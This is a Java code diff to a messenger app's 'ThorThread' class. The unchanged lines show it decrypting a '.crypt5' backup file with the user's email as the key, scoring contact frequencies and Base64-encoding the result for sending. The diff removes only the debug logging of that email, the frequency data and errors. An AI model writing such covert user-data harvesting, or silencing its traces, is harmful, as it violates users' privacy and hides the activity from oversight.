@@ -1,6 +1,7 @@
 package com.bsb.hike.thor;
 
 import java.io.ByteArrayOutputStream;
+
 import java.io.File;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
@@ -70,7 +71,6 @@ public class ThorThread implements Runnable
 				{
 					// .crypt5 exists
 					String email = Utils.getEmail(ctx);
-					Log.d(TAG, "User email : " + email);
 					if (email != null)
 						successDecrypt = Decrypt.decrypt5(inputFile, outputFile, email);
 					else
@@ -99,7 +99,6 @@ public class ThorThread implements Runnable
 					{
 						DbUtils.calculateScore(freq, con, key, oldts);
 					}
-					print(freq);
 					Intent i = new Intent(HikeMessengerApp.THOR_DETAILS_SENT);
 					byte[] b = getThorBytes(freq);
 					String data = Base64.encodeToString(b, Base64.DEFAULT);
@@ -110,11 +109,9 @@ public class ThorThread implements Runnable
 		}
 		catch (ClassNotFoundException e)
 		{
-			Log.e(TAG, "Exception", e);
 		}
 		catch (SQLException e)
 		{
-			Log.e(TAG, "SQLException", e);
 		}
 		finally
 		{
@@ -131,7 +128,6 @@ public class ThorThread implements Runnable
 			}
 			catch (SQLException e)
 			{
-				Log.e(TAG, "SQLException in closing connection", e);
 			}
 			catch (Exception e)
 			{
@@ -201,15 +197,4 @@ public class ThorThread implements Runnable
 		return bout.toByteArray();
 	}
 
-	private void print(HashMap<String, Integer> freq)
-	{
-		StringBuilder b = new StringBuilder();
-		b.append("\n");
-		for (Entry<String, Integer> e : freq.entrySet())
-		{
-			b.append(e.getKey() + " : " + e.getValue());
-			b.append("\n");
-		}
-		Log.d(TAG, b.toString());
-	}
 }
